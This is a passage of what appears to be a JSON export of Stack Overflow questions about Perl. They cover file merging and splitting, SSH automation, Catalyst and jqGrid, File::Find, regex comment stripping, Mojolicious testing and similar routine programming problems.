clearly.</p>\n"},{"tags":["perl","date","strftime"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":12334014,"title":"How to implement an addate utility in perl?","body":"<p>I have no experience with perl and I need to create an utility which will print a date after adding an offset, the format string is an strftime format string.</p>\n\n<blockquote>\n  <p>Format: ./adddate number_of_days [format_string]</p>\n  \n  <p>Example: ./adddate -1 \"%a, %b %d\" # Print the date for yesterday</p>\n</blockquote>\n"},{"tags":["perl","vim"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":115,"score":1,"question_id":12341663,"title":"VIM: Syntastic high CPU usage with filetype perl","body":"<p>I use syntastic plugin with vim to check for error's when I save a file using <code>:w</code>. </p>\n\n<p>Today I <code>suddenly</code> observed that when I tried to check my perl file for errors by saving it syntastic took a lot of time (~7-8 secs) to report any errors and during that whole time my CPU usage was <code>30-35%</code>. I also tried it with a file that doesn't contains any error and the result was same as previous.</p>\n\n<p>Now during this interval I checked <code>htop</code> to see what process are running in reference to <code>vim+perl</code>. I found these two process at the top:</p>\n\n<pre><code>perl -c -X test.pl\nperl -c -w test.pl\n</code></pre>\n\n<p>Now the interesting thing is CPU usage only rose when I use an external module in my code. If I am writing a normal perl code which includes the perl core modules everything works fine.</p>\n\n<p>The problem arised when I used <a href=\"http://search.cpan.org/~jquelin/Audio-MPD-1.120610/lib/Audio/MPD.pm\" rel=\"nofollow\">this module</a> and the code I use is <a href=\"http://sprunge.us/HFPi\" rel=\"nofollow\">http://sprunge.us/HFPi</a></p>\n\n<p>So, anybody got any ideas for this weird problem.</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12340575,"title":"Skip the problematic DAT and proceed with next DATs and out put the error or missed DATs list in separate text file in Perl","body":"<p>I have another question here, i have several dats and want to merge them. But the script first checks for header of all the DATs and if not matching it will throw error and stop the script. Now i want to run the script skipping the problematic dat and output the error in separate text file with list of errored DAts and reason. Could anyone please help on this. Here is what i have so far:</p>\n\n<pre><code>use strict;\nmy $rootdir = $ARGV[0];\ndie \"usage: perl mergetxtfiles.pl &lt;folder&gt;\" if ($#ARGV != 0);\n#$rootdir =~ s/\\\\/\\\\\\\\/g;\n\nprint \"\\nFolder = $rootdir\\n\\n\";\nopendir(DIR, $rootdir)\n    or die \"failed opening the directory $rootdir\";\nopen(OF,\"&gt;:utf8\",'combined_'.time.'.dat')\n    or die \"failed opening the file\";\n\nmy $icr         = 0;\nmy $cnt         = 0;\nmy $header      = '';\nmy $header_flag = 0;\n\nwhile(my $fname = readdir(DIR)) {\n\n    # add extensions if needed\n    if ($fname =~ m/(\\.txt)|(\\.dat)|(\\.csv)$/i) {\n\n        $icr++;\n        my $fnamepath = $rootdir.'\\\\'.$fname;\n        print \"\\($icr\\) $fname\\n\";\n        open(IF, \"&lt;:utf8\", $fnamepath)\n            or die \"ERROR: cannot open the file\\n$fnamepath \"; \n\n        my $sep_icr = 0;\n        while(&lt;IF&gt;) {\n\n            my $line = $_;\n            chomp $line;\n            next if (/^$/);\n\n            $sep_icr++;\n            $cnt++;\n\n            my @ar = split(/\\t/,$line);\n\n            if ($cnt == 1) {\n\n                $header_flag = 1;\n                $header      = $line;\n            }\n\n            if ($sep_icr == 1 and $header_flag == 1) {\n\n                #print \"$line \\n $header\\n\";\n                if ($line ne $header) {\n\n                    die \"Headers are not same\\n\";\n                }\n                elsif (($line eq $header) and ($cnt &gt;1)) {\n\n                    print \"INFO\\: ignoring the same header for $fname \\n\";\n                    $cnt--; \n                    next; \n                }\n            }\n            print OF $line.\"\\n\";\n        }\n        print \"\\--Line count= $sep_icr\\n\\n\";\n        close IF;\n        #print OF \"\\n\";\n    }\n}\n\nprint \"\\-\\-\\&gt; Total line count= $cnt\\n\";\n</code></pre>\n"},{"tags":["java","perl","http","post"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":117,"score":0,"question_id":12171564,"title":"What is Java equivalent of this Perl http POST","body":"<p>(First Stack Overlflow question!)\nI'm having a hard time coding the equivalent form-data http POST in Java based on the Perl example below.  I've even used WireShark to try to capture this working example so I can study the XML data being posted so I can code that in Java, but no dice.  Does anyone know what this XML from the code below would look like?  I can authenticate fine, but the form data keeps being rejected in my Java code.</p>\n\n<pre><code>my $ua = LWP::UserAgent-&gt;new();\n$ua-&gt;timeout($MYTIMEOUT);\n$ua-&gt;credentials(\"myweb03:80\",\"mydomain.com\",$user, $password);\n\nmy $response = $ua-&gt;post($PEPSURL, 'content-type' =&gt; 'form-data',\n                                 Content =&gt; {\n                                 username =&gt; $user,\n                                 prep_id =&gt; $prep_id,\n                                 project =&gt; $project,\n                                 upfile  =&gt; [ $uploadfile ],\n                                 discussion =&gt; $discussion,\n                                 silentsave =&gt; int($silentFlag)\n\n             });\n</code></pre>\n"},{"tags":["perl","ip-address","perl-module"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":76,"score":3,"question_id":12340882,"title":"Perl: Obtain range of IP addresses not in the given list","body":"<p>I'm trying to create ranges of IP addresses based off a file containing a series of IP addresses. The ranges I'm trying to create are those that are not in the file. For example, If I had the following IP addresses:</p>\n\n<pre><code>129.32.0.1\n27.45.2.2\n129.32.0.2\n65.18.2.4\n</code></pre>\n\n<p>The output should be <code>0.0.0.0-27.45.2.1,27.45.2.3-65.18.2.3,65.18.2.5-129.32.0.0,129.32.0.3-255.255.255.255</code></p>\n\n<p>What I've currently done is extract the IPs from an input file and store them into a sorted array (ascending).</p>\n\n<pre><code>#!/usr/bin/perl -w\nuse strict;                                           \nuse Sort::Key::IPv4 qw(ipv4sort);                                                          \nmy $list = 'C:\\Desktop\\IPs.txt';\nmy $ipRange;\nmy @ips;\nmy $i = 0;\n\n# Get IP Addresses into array\nopen(FILE, $list);\n\nwhile (&lt;FILE&gt;) {\n    chomp($_);\n    $ips[$i] = ($_);\n    ++$i;\n}\n\n# Sort IP Addresses\nmy @sorted = ipv4sort @ips;\n\n# Create IP Ranges\n</code></pre>\n\n<p>I'm hoping that there is something on CPAN that can help me out. I've seen modules that can determine if an IP address is in a range, but have yet to see anything that can split a range.</p>\n"},{"tags":["perl","jqgrid","catalyst"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":61,"score":1,"question_id":12340636,"title":"How to POST additional parameters to editurl?","body":"<p>I've spent several hours looking at examples and docs trying to figure out how to POST additional parameters to <code>editurl</code>, and have yet to figure this out. I'm using Perl Catalyst.</p>\n\n<p>Though I don't have it all coded in the controller, I am getting what I need POSTed to add and edit, but not to delete records. I need <code>inv_id</code> to be POSTed to the server for my controller to delete a record.</p>\n\n<p>Controller/Root.pm:</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>package MyFirstGrid::Controller::Root;\nuse Moose;\nuse namespace::autoclean;\n\nBEGIN {extends 'Catalyst::Controller'}\nwith 'Catalyst::TraitFor::Controller::jQuery::jqGrid';\n\n__PACKAGE__-&gt;config(namespace =&gt; '');\n\nsub index :Path :Args(0) {\n  my ($self, $c) = @_;\n\n  $c-&gt;detach($c-&gt;view(\"TT\"));\n}\n\nsub getdata :Local {\n  my ($self, $c) = @_;\n\n  my $inv_rs = $c-&gt;model('DB::Inventory')-&gt;search({});\n  $inv_rs = $self-&gt;jqgrid_page($c, $inv_rs);\n  my @row_data;\n  while (my $inv = $inv_rs-&gt;next) {\n    my $single_row = {\n      cell =&gt; [\n        $inv-&gt;inv_id,\n        $inv-&gt;client_id,\n        $inv-&gt;amount,\n        $inv-&gt;tax,\n        $inv-&gt;total,\n        $inv-&gt;note,\n      ],\n    };\n    push @row_data, $single_row;\n  }\n  $c-&gt;stash-&gt;{json_data}{rows} = \\@row_data;\n  $c-&gt;detach($c-&gt;view(\"JSON\")); \n}\n\nsub postrow :Local {\n  my ($self, $c) = @_;\n\n  my $data = $c-&gt;req-&gt;params;\n  my $inv_rs = $c-&gt;model('DB::Inventory')-&gt;search({inv_id =&gt; $data-&gt;{inv_id}});\n  $inv_rs-&gt;update({\n    client_id =&gt; $data-&gt;{client_id},\n    amount =&gt; $data-&gt;{amount},\n    tax =&gt; $data-&gt;{tax}, \n    total =&gt; $data-&gt;{total}, \n    note =&gt; $data-&gt;{note}, \n  });\n  $c-&gt;res-&gt;status(204); \n}\n\nsub default :Path {\n  my ($self, $c) = @_;\n\n  $c-&gt;response-&gt;body('Page not found');\n  $c-&gt;response-&gt;status(404);\n}\n\nsub end : ActionClass('RenderView') {}\n\n__PACKAGE__-&gt;meta-&gt;make_immutable;\n\n1; \n</code></pre>\n\n<p>index.tt:</p>\n\n<pre class=\"lang-xhtml prettyprint-override\"><code>&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\"&gt;\n&lt;html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" lang=\"en\"&gt;\n&lt;head&gt;\n&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt;\n&lt;title&gt;My First Grid&lt;/title&gt;\n\n&lt;link rel=\"stylesheet\" type=\"text/css\" media=\"screen\" href=\"[% c.uri_for('/static/css/cupertino/jquery-ui-1.8.22.custom.css') %]\" /&gt;\n&lt;link rel=\"stylesheet\" type=\"text/css\" media=\"screen\" href=\"[% c.uri_for('/static/css/ui.jqgrid.css') %]\" /&gt;\n\n&lt;style type=\"text/css\"&gt;\nhtml, body {\n  margin: 0;\n  padding: 0;\n  font-size: 75%;\n}\n&lt;/style&gt;\n\n&lt;script src=\"[% c.uri_for('/static/js/jquery-1.7.2.min.js') %]\" type=\"text/javascript\"&gt;&lt;/script&gt;\n&lt;script src=\"[% c.uri_for('/static/js/i18n/grid.locale-en.js') %]\" type=\"text/javascript\"&gt;&lt;/script&gt;\n&lt;script src=\"[% c.uri_for('/static/js/jquery.jqGrid.min.js') %]\" type=\"text/javascript\"&gt;&lt;/script&gt;\n\n&lt;script type=\"text/javascript\"&gt;\n$(function(){ \n  $(\"#list\").jqGrid({\n    url: \"[% c.uri_for(\"getdata\") %]\",\n    datatype: 'json',\n    mtype: 'GET',\n    colNames:['Inv No', 'Client ID', 'Amount','Tax','Total','Notes'],\n    colModel :[ \n      //{name:'inv_id', index:'inv_id', editable:true, hidden:true, editrules:{edithidden:false}, hidedlg:true}, \n      {name:'inv_id', index:'inv_id', editable:true, hidden:true}, \n      {name:'client_id', index:'client_id', width:55, editable:true, editoptions:{size:10}},\n      {name:'amount', index:'amount', width:80, align:'right', editable:true, editoptions:{size:10}}, \n      {name:'tax', index:'tax', width:80, align:'right', editable:true, editoptions:{size:10}}, \n      {name:'total', index:'total', width:80, align:'right', editable:true, editoptions:{size:10}}, \n      {name:'note', index:'note', width:150, sortable:false, editable: true, edittype:\"textarea\", editoptions:{rows:\"2\",cols:\"20\"}} \n    ],\n    pager: '#pager',\n    rowNum:10,\n    rowList:[10,20,30],\n    sortname: 'inv_id',\n    sortorder: 'desc',\n    viewrecords: true,\n    caption: 'My First Grid: Navigator',\n    editurl: \"[% c.uri_for(\"postrow\") %]\",\n    height: 240\n  }); \n\n  jQuery(\"#list\").jqGrid('navGrid','#pager',\n    {}, //options\n    {height:280,reloadAfterSubmit:false}, // edit options\n    {height:280,reloadAfterSubmit:false}, // add options\n    {reloadAfterSubmit:false}, // del options \n    {} // search options\n  ); \n\n}); \n&lt;/script&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n&lt;table id=\"list\"&gt;&lt;tr&gt;&lt;td/&gt;&lt;/tr&gt;&lt;/table&gt; \n&lt;div id=\"pager\"&gt;&lt;/div&gt; \n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n"},{"tags":["windows","perl","ssh"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":157,"score":0,"question_id":9870955,"title":"Net::SSH::Win32Perl hangs","body":"<p>Hi I am trying to do a simple ls on a unix box from windows xp machine. It hangs and does not exit also. what could be the issue</p>\n\n<pre><code> use Net::SSH::W32Perl;\n use diagnostics;\n\n    my $host = 'host';\n    my $ssh = new Net::SSH::W32Perl($host, debug =&gt; 1);\n    $ssh-&gt;login('username', 'password');\n    my $cmd = \"ls\";\n    my($stdout, $stderr, $exit) = $ssh-&gt;cmd($cmd);\n    print \"$stdout\";\n    exit;\n</code></pre>\n\n<p>below is the output, notice that it has been able to login using password authentication but its not able to give the output. Why is that?</p>\n\n<pre><code>&gt;  C:\\&gt;perl winssh.pl\n&gt;     WXVM0026: Reading configuration data c:\\/.ssh/config\n&gt;     WXVM0026: Reading configuration data /etc/ssh_config\n&gt;     WXVM0026: Connecting to hp-test, port 22.\n&gt;     WXVM0026: Socket created, turning on blocking...\n&gt;     WXVM0026: Remote protocol version 2.0, remote software version OpenSSH_4.3p2-hpn\n&gt;     WXVM0026: Net::SSH::Perl Version 1.34, protocol version 2.0.\n&gt;     WXVM0026: No compat match: OpenSSH_4.3p2-hpn.\n&gt;     WXVM0026: Connection established.\n&gt;     WXVM0026: Sent key-exchange init (KEXINIT), wait response.\n&gt;     WXVM0026: Algorithms, c-&gt;s: 3des-cbc hmac-sha1 none\n&gt;     WXVM0026: Algorithms, s-&gt;c: 3des-cbc hmac-sha1 none\n&gt;     WXVM0026: Entering Diffie-Hellman Group 1 key exchange.\n&gt;     WXVM0026: Sent DH public key, waiting for reply.\n&gt;     WXVM0026: Received host key, type 'ssh-dss'.\n&gt;     WXVM0026: Host 'hp-test' is known and matches the host key.\n&gt;     WXVM0026: Computing shared secret key.\n&gt;     WXVM0026: Verifying server signature.\n&gt;     WXVM0026: Waiting for NEWKEYS message.\n&gt;     WXVM0026: Send NEWKEYS.\n&gt;     WXVM0026: Enabling encryption/MAC/compression.\n&gt;     WXVM0026: Sending request for user-authentication service.\n&gt;     WXVM0026: Service accepted: ssh-userauth.\n&gt;     WXVM0026: Trying empty user-authentication request.\n&gt;     WXVM0026: Authentication methods that can continue: publickey,password,keyboard-interactive.\n&gt;     WXVM0026: Next method to try is publickey.\n&gt;     WXVM0026: Next method to try is password.\n&gt;     WXVM0026: Trying password authentication.\n&gt;     WXVM0026: Login completed, opening dummy shell channel.\n&gt;     WXVM0026: channel 0: new [client-session]\n&gt;     WXVM0026: Requesting channel_open for channel 0.\n&gt;     WXVM0026: channel 0: open confirm rwindow 0 rmax 32768\n&gt;     WXVM0026: Got channel open confirmation, requesting shell.\n&gt;     WXVM0026: Requesting service shell on channel 0.\n&gt;     WXVM0026: channel 1: new [client-session]\n&gt;     WXVM0026: Requesting channel_open for channel 1.\n&gt;     WXVM0026: Entering interactive session.\n&gt;     WXVM0026: Sending command: ls\n&gt;     WXVM0026: Sending command: ls\n&gt;     WXVM0026: Requesting service exec on channel 1.\n&gt;     WXVM0026: channel 1: send eof\n&gt;     WXVM0026: channel 1: open confirm rwindow 2097151 rmax 32768\n&gt;     WXVM0026: input_channel_request: rtype exit-status reply 0\n&gt;     WXVM0026: channel 1: rcvd eof\n&gt;     WXVM0026: channel 1: output open -&gt; drain\n&gt;     WXVM0026: channel 1: rcvd close\n</code></pre>\n"},{"tags":["perl","ssh"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":137,"score":1,"question_id":11317728,"title":"Net SSH Perl error trying to use exit code","body":"<p><strong>CODE</strong></p>\n\n<pre><code>#!/usr/bin/perl -w\nuse strict;\nuse warnings;\nuse Net::SSH::Perl;\n\nmy $ssh_to=\"10.1.1.9\";\nmy @KEYFILE = (\"/home/nagios/.ssh/id_dsa.pub\");\nmy $local=\"10.1.1.5\";\nmy $vip_ip=\"10.1.1.50:80\";\n\nmy $remove  = \"/usr/bin/sudo /sbin/ipvsadm -e -t $vip_ip -r $local -w 0\";\nmy $ssh = Net::SSH::Perl-&gt;new($ssh_to, identity_files=&gt;\\@KEYFILE);\nmy ($stdout, $stderr, $exit) = $ssh-&gt;cmd($remove);\nif ( $exit eq 0) { sleep(300); }\n</code></pre>\n\n<p><strong>OUTPUT</strong></p>\n\n<pre>[root@host]# ./mytest.pl<br>\nUse of uninitialized value in string eq at ./mytest.pl line 14, &lt;GEN0> line 1</pre>\n"},{"tags":["perl","www-mechanize"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":12340287,"title":"How can I select a value matching my input from a TypeAhead control using WWW::Mechanize?","body":"<p>So ordinarily the element I want to pick from a list would be populated on a page and I'd just find it and pick it.  But I'm dealing with a control that doesn't populate list elements until some input has been stuck into a text box, after which it gives me a list of recommendations.</p>\n\n<p>For an example of the kind of list I'm talking about think of Facebook's \"People, Places, and Things\" search field.</p>\n\n<p>I want to plug a string into this text box, select the same string from the list of recommendations, and submit the form.  The issue I'm having right now is I can't seem to get Mechanize to even recognize the field is there.  I examine a dump of <code>$mech-&gt;find_all_inputs</code> and it isn't listed.  Is this kind of field just beyond Mechanize's jurisdiction?</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":60,"score":1,"question_id":12338630,"title":"Adding header of the first file to all the other split files in Perl","body":"<p>I need to add header of the first main file to all the split files. i.e I am able to get header for the 1st split file but i need it for all the split files, here I am splitting DAT file. Below is what i have done so for:</p>\n\n<pre><code>#!usr/bin/perl -w\n\nmy $chunksize  = 25000000; # 25MB\nmy $filenumber = 0;\nmy $infile     = \"Test.dat\";\nmy $outsize    = 0;\nmy $eof        = 0;\n\nmy $line = $_;\n\nopen INFILE, $infile;\nopen OUTFILE, \"&gt;outfile_\".$filenumber.\".dat\";\n\nwhile (&lt;INFILE&gt;) {\n    chomp;\n\n    if ($outsize &gt; $chunksize) {\n\n        close OUTFILE; \n        $outsize = 0;\n        $filenumber++;\n\n        open (OUTFILE, \"&gt;outfile_\".$filenumber.\".dat\")\n            or die \"Can't open outfile_\".$filenumber.\".dat\";\n\n    }\n\n    print OUTFILE \"$_\\n\";\n    $outsize += length;\n}\nclose INFILE;\n</code></pre>\n"},{"tags":["perl","google-maps","geolocation"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":2,"view_count":168,"score":0,"question_id":12335770,"title":"Google maps api for Perl","body":"<p>I just wonder is there anywhere to make use of perl to run google map api as backend application.<br>\nFor example, if I want to use \"google.maps.LatLngBounds\" in perl but I do not want to run it in browser.  I just want a perl program to run in console mode.  How do I achieve this?</p>\n\n<p>I search around on the CPAN, it just a few of functionality of the full api.  Is there any other way beside this?</p>\n\n<p>Thanks.</p>\n"},{"tags":["perl","bytecode"],"answer_count":2,"favorite_count":0,"up_vote_count":9,"down_vote_count":0,"view_count":141,"score":9,"question_id":12332046,"title":"How do I create a perl sub by specifying its parse tree?","body":"<p>Given a CODE ref, is it possible to:</p>\n\n<ol>\n<li>Access the parse tree of that CODE ref</li>\n<li>Create a new CODE ref by specifying the parse tree of the CODE ref which can contain elements of the parse tree returned in <sup>1</sup></li>\n</ol>\n\n<p>Normally we create subroutines in perl by specifying source code which is then parsed and converted into a parse tree.</p>\n\n<p>I would like to write a perl function which can create a subroutine by specifying its parse tree, and that parse tree could be derived from another parse tree of some other subroutine.</p>\n\n<p>Possible?</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":150,"score":2,"question_id":12334037,"title":"Perl: How to stop File::Find entering directory recursively?","body":"<p>I was looking at Perl's <code>File::Find</code> module and tried it in the following way:</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse warnings;\nuse strict;\n\nuse File::Find;\n\nfind({wanted =&gt; \\&amp;listfiles,\n        no_chdir =&gt; 1}, \".\");\n\n\nsub listfiles{\n    print $File::Find::name,\"\\n\";\n}\n</code></pre>\n\n<p>Now When I run it I get the below output:</p>\n\n<pre><code>Noob@Noob:~/tmp$ perl test.pl \n.\n./test.txt\n./test.pl\n./test1.txt\n./hello\n./hello/temp.txt\n</code></pre>\n\n<p>Now, I was thinking that by setting <code>no_chdir=&gt;1</code> I will make my code to not enter any directory if it came across one. But the output clearly shows that my code is entering <code>hello</code> directory and listing its files.</p>\n\n<p>So, how do I change my code to behave like <code>ls</code> and not enter any directory. Also I am getting <code>./</code> in front of my file/directory names can that be removed?</p>\n\n<p>I am using Perl 5.14.</p>\n"},{"tags":["perl","gui"],"answer_count":11,"favorite_count":2,"up_vote_count":9,"down_vote_count":0,"view_count":4624,"score":9,"question_id":695722,"title":"What are good interactive GUI builder packages for Perl?","body":"<p>I'd like to write some interactive GUIs in Perl. I've used TclTk but it looks dated. I've written QT code for C++, but the PerlTk module hasn't had a release in several years. Googling around I see other possible options. </p>\n\n<p>What are good packages for this, including basic windowing, menus, drawing canvas, scrollbars, and so on.</p>\n"},{"tags":["perl"],"answer_count":6,"favorite_count":0,"up_vote_count":3,"down_vote_count":3,"view_count":111,"score":0,"question_id":12322942,"title":"convert date format from 9/15/12 to 255 in perl.","body":"<p>I was wondering if someone could show me how to convert 9/15/12 to 255 format.\nSomething in php from getdate array you can get ydate.</p>\n\n<p>thanks</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":104,"score":1,"question_id":12329740,"title":"String comparison mysteriously failing","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/1175390/how-do-i-compare-two-strings-in-perl\">How do I compare two strings in Perl?</a>  </p>\n</blockquote>\n\n\n\n<p>Why does this script always return \"You won\"?</p>\n\n<pre><code>print \"Choose heads or tails :\\n\";\n$answer = &lt;STDIN&gt;;\nchomp $answer;\n\nif( $answer == \"heads\" ) {\n    print \"You won\\n\";\n}\nelse {\n    print \"Moron! You lost.\\n\"\n}\n</code></pre>\n\n<p>And what should be the correct code for the same?</p>\n"},{"tags":["regex","perl","segmentation-fault"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":92,"score":0,"question_id":12331414,"title":"Improve regex to match javascript comments","body":"<p>I used the regex given in <a href=\"http://perldoc.perl.org/perlfaq6.html#How-do-I-use-a-regular-expression-to-strip-C-style-comments-from-a-file?\" rel=\"nofollow\">perlfaq6</a> to match and remove javascript comments, but it results in segmentation fault when the string is too long. The regex is -</p>\n\n<pre><code>s#/\\*[^*]*\\*+([^/*][^*]*\\*+)*/|//([^\\\\]|[^\\n][\\n]?)*?\\n|(\"(\\\\.|[^\"\\\\])*\"|'(\\\\.|[^'\\\\])*'|.[^/\"'\\\\]*)#defined $3 ? $3 : \"\"#gse;\n</code></pre>\n\n<p>Can it be improved to avoid segmentation fault ?</p>\n\n<p>[EDIT]</p>\n\n<p>Long input: </p>\n\n<pre><code>&lt;ent r=\\\"6\\\" t=\\\"259\\\" w=\\\"252\\\" /&gt;&lt;ent r=\\\"6\\\" t=\\\"257\\\" w=\\\"219\\\" /&gt;\n</code></pre>\n\n<p>repeated about a 1000 times.</p>\n"},{"tags":["perl","svk","getpwuid"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":12320726,"title":"SVK synk and scheduled task","body":"<p>I'm trying to automate a SVK sync process.<br>\nAfter configuring SVK mirrors, I wrote a batch file with the following</p>\n\n<pre><code>svk sync -a &gt;&gt; svk.log &amp;2&gt;1\n</code></pre>\n\n<p>then I add a Windows Scheduled task running under my administrative account.</p>\n\n<p>in svk.log I read</p>\n\n<blockquote>\n  <p>The getpwuid function is unimplemented at C:\\Programmi\\svk\\bin\\svk\n  line 142.</p>\n</blockquote>\n\n<p>Any hint?</p>\n\n<p>p.s. I'm able to run svn sync -a from the command line (same user)</p>\n"},{"tags":["perl","eval"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":81,"score":4,"question_id":12326903,"title":"Long eval string at the beginnning of Perl script","body":"<p>I am relatively new to Perl and am working on Perl files written by someone else, and I keep encountering the following statement at the beginning of the scripts:</p>\n\n<pre><code>eval '(exit $?0)' &amp;&amp; eval 'exec perl -w -S $0 ${1+\"$@\"}' &amp;&amp; eval 'exec perl -w -S $0 $argv:q'                                                                                      \n  if 0;  \n</code></pre>\n\n<p>What do these two lines do? What is the code checking? and What does the <code>if 0;</code> sentence do?</p>\n"},{"tags":["perl","encoding","stdout"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":80,"score":2,"question_id":12324228,"title":"perl: capturing STDOUT- logfile ends up binary","body":"<p>I wrote a script that feeds data into an exe program called ctffind.  The exe program outputs a bunch of data to the screen which I'm trying to capture in a logfile.</p>\n\n<p>Here's what I'm using right now</p>\n\n<pre><code>my $logout = logfile \nopen STDOUT, '&gt;&gt;', \"$logout\";\nopen my $PIPE1, '|-', '/opt/ctf/ctffind3_mp.exe' or die $!;\n</code></pre>\n\n<p>It works outputting everything that appeared on the screen into logfile.</p>\n\n<p>If I <code>more $logfile</code> the file displays as expected it's about 5000 lines long and has about 50 lines that contain the string \"final values\".  In my next step I do <code>grep \"final values\" logfile</code> it thinks logfile is a binary file and doesn't work instead it returns:</p>\n\n<pre><code>Binary file logfile matches\n</code></pre>\n\n<p>How do set it so that logfile is properly encoded?\nctffind.exe is also generating binary files while it runs, is this part of the problem?</p>\n"},{"tags":["perl","hash","iterate","key-value"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":85,"score":0,"question_id":12316293,"title":"Perl - how do I get the previous key in a hash?","body":"<p>I have a hash that has been filled with an unknown number of keys that are strings. Each key's value is zero to start. </p>\n\n<p>I want to iterate through this hash and for each element except the first, make its value equal the equivalent in another hash I have plus the previous value in this hash. So mathematically something like:</p>\n\n<pre><code>hash1:a = hash2:a;\nhash1:b = hash2:b + hash1:a;\nhash1:c = hash2:c + hash1:b;\nhash1:d = hash2:d + hash1:c;\nhash1:e = hash2:e + hash1:d;\n...\n</code></pre>\n\n<p>I'm not even really sure I know how to do the first one as I don't know what the value or key is. I plan to sort it first, but as the keys could be any in a list I have I cannot specify what would be first exactly. I don't know how to reference the previous value based on the key. Is this possible? </p>\n\n<p>(I don't have any code to show I'm afraid, I tried but I just realised that it is very wrong haha)</p>\n"},{"tags":["perl","unit-testing","mojolicious"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":82,"score":2,"question_id":12328455,"title":"How to test for a redirect in Mojolicious?","body":"<p>I want to test a page with a form which, when submitted, will redirect to the resulting page for the submitted item.</p>\n\n<p>My Mojolicious controller contains:</p>\n\n<pre><code>sub submit_new {\n    my $self = shift;\n\n    my $new = $self-&gt;db-&gt;resultset('Item')-&gt;new( {\n        title       =&gt; $self-&gt;param('title'),\n        description =&gt; $self-&gt;param('description'),\n    } );\n    $new-&gt;insert;\n\n    # show the newly submitted item\n    my $id = $new-&gt;id;\n    $self-&gt;redirect_to(\"/items/$id\");\n}\n</code></pre>\n\n<p>The test script for this controller contains:</p>\n\n<pre><code>use Test::More;\nuse Test::Mojo;\n\nmy $t = Test::Mojo-&gt;new('MyApp');\n\nmy $tx = $t-&gt;ua-&gt;build_form_tx('/items/new/submit' =&gt; $data);\n$tx-&gt;req-&gt;method('POST');\n$t-&gt;tx( $t-&gt;ua-&gt;start($tx) )\n  -&gt;status_is(302);\n</code></pre>\n\n<p>My issue is that it stops with the <code>302</code> status. How do I proceed with the redirect so I can verify the resulting item page?</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":88,"score":1,"question_id":12325968,"title":"Perl Compare Strings without Numbers","body":"<p>I have 2 variables:</p>\n\n<pre><code>my $var1 = 'package-name-1.4';\nmy $var2 = 'package-name-1.5';\n</code></pre>\n\n<p>What I'm trying to do, is to compare $var1 to $var2, while excluding the numbers.</p>\n\n<p>I have looked online and tried Regex but I can't get it working, I'd greatly appreciate some help.</p>\n\n<p>What I have in mind is as follows:</p>\n\n<pre><code>if (removeNumbers($var1) =~ removeNumbers($var2))\n</code></pre>\n\n<p>So that the result would be like comparing: package-name- with package-name-, thus evaluating true.</p>\n\n<p>Thanks in advance for your help!</p>\n"},{"tags":["python","perl","bash","sed"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":5,"view_count":150,"score":-5,"question_id":12326986,"title":"Add a new line at the end of file","body":"<p>I've seen ways of adding new line to each file (10 text files+ at once), but this normally involves creating a new file.. Is there a way to add a new line without the need for making a temp file (basically the source file and dest file should be the same). </p>\n"},{"tags":["perl","apache","cgi"],"answer_count":4,"favorite_count":4,"up_vote_count":9,"down_vote_count":0,"view_count":19655,"score":9,"question_id":560749,"title":"How do I configure apache2 to run Perl CGI scripts?","body":"<p>Im would like to configure apache2 running on Kubuntu to execute Perl CGI scripts. I've tried some steps I came across by googling, but nothing seems to work.\nCan someone please point me to the right way of achieving this?</p>\n\n<p>Thank You.</p>\n"},{"tags":["perl","shell","sed"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":12319958,"title":"leave a new line only before a pattern","body":"<p>i need to reformat a file in shell, so i only leave the 'new line' before some pattern. Ex:</p>\n\n<p>Input:</p>\n\n<pre><code>Europe First\nAsia Second\nAfrica Third\nAustralia Fourth\nEurope Sixth\nAustralia Seventh\nEurope  Eight\nAmerica Last\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>Europe FirstAsia SecondAfrica ThirdAustralia Fourth\nEurope SixthAustralia Seventh\nEurope  EightAmerica Last\n</code></pre>\n\n<p>where the pattern is 